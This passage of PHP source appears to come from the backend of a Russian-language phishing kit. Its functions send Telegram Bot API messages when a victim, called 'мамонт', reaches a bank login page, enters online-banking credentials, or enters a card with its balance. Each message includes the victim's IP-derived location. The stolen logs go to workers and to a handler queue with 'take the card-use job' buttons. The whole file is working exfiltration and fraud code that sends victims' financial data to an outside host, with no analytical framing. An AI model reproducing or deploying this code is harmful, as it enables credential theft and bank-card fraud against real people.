      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

function checkLK($service, $valute, $id, $name, $price, $worker_id, $bank){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Мамонт на странице ввода ЛК".PHP_EOL;
  $r_user .= "<b>❇️ Банк</b>: " . $bank.PHP_EOL;
  $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}



function sendLKi($service, $valute, $id, $name, $price, $worker_id, $bank, $fname, $msg){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

    $worker = simplexml_load_file("/var/www/html/" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . "/data/" . $id .  ".xml");
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел ЛК!".PHP_EOL;
    $r_user .= "<b>❇️ Bank</b>: $bank".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
    $r_log .= "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    } else {
    $r_log = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    }
  
    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
      $r_log .= "Лог закреплен вбивером #" . file_get_contents("/var/www/html/node/database/maindb/" . file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id) . "/tag").PHP_EOL;
      $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Перевбив","callback_data"=>"@mpick:" . $fname)]]));
    }else{
      $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Взять вбив","callback_data"=>"@pick:" . $fname)]]));
    }

    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
    $handler_id = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
    $response = array(
        'chat_id' => $handler_id,
        'text' => $r_log,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $abc = curl_exec($ch);
    curl_close($ch);
    } else {
    $response = array(
        'chat_id' => LOGS,
        'text' => $r_log,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $abc = curl_exec($ch);
    curl_close($ch);
    }
  
    $r_log2 = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log2 .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log2 .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>$service LOG INFO</b>".PHP_EOL.PHP_EOL;
    $r_log2 .= $msg;
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendLKcz($service, $valute, $id, $name, $price, $worker_id, $bank, $fname, $msg){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

    $worker = simplexml_load_file("/var/www/html/" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . "/data/" . $id .  ".xml");
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел ЛК!".PHP_EOL;
    $r_user .= "<b>❇️ Bank</b>: $bank".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
    $r_log .= "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    } else {
    $r_log = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    }
  
    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
      $r_log .= "Лог закреплен вбивером #" . file_get_contents("/var/www/html/node/database/maindb/" . file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id) . "/tag").PHP_EOL;
      $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Перевбив","callback_data"=>"@lpick:" . $fname)]]));
    }else{
      $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Взять вбив","callback_data"=>"@qpick:" . $fname)]]));
    }

    if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
    $handler_id = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
    $response = array(
        'chat_id' => $handler_id,
        'text' => $r_log,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $abc = curl_exec($ch);
    curl_close($ch);
    } else {
    $response = array(
        'chat_id' => LOGS,
        'text' => $r_log,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $abc = curl_exec($ch);
    curl_close($ch);
    }
  
    $r_log2 = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
    $r_log2 .= "<b>🏦 $bank</b>".PHP_EOL;
    $r_log2 .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>$service LOG INFO</b>".PHP_EOL.PHP_EOL;
    $r_log2 .= $msg;
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

function zsendCardi($service, $valute, $id, $name, $price, $worker_id, $card, $fname, $msg, $bal){

    $worker = simplexml_load_file("/var/www/html/" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . "/data/" . $id .  ".xml");

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Мамонт ввел карту!".PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  $r_user .= "<b>❇️ Карта</b>: ". $card .PHP_EOL;
  $r_user .= "<b>❇️ Баланс</b>: $bal".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);

  $r_log = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
  $r_log .= "<b>🏦 $card</b>".PHP_EOL;
  $r_log .= "<b>💸 $bal</b>".PHP_EOL;
  $r_log .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
  $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  if (file_exists("/var/www/html/logs_ck/" . $id . "_" . $worker_id)) {
    $r_log .= "Лог закреплен вбивером #" . file_get_contents("/var/www/html/node/database/maindb/" . file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id) . "/tag").PHP_EOL;
    $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Перевбив","callback_data"=>"@zpick:" . $fname)]]));
  }else{
    $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Взять вбив","callback_data"=>"@cpick:" . $fname)]]));
  }

  $response = array(
      'chat_id' => LOGS,
      'text' => $r_log,
      "parse_mode" => "html",
      "reply_markup" => $reply_m
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  $abc = curl_exec($ch);
  curl_close($ch);

  $r_log2 = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
  $r_log2 .= "<b>🏦 $card</b>".PHP_EOL;
  $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  $r_log2 .= "<b>👥 Worker: @". $worker->worker ."</b>".PHP_EOL;
  $r_log2 .= "<b>$service LOG INFO</b>".PHP_EOL.PHP_EOL;
  $r_log2 .= $msg;

  $response = array(
      'chat_id' => ALOGS,
      'text' => $r_log2,
      "parse_mode" => "html",
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

?>
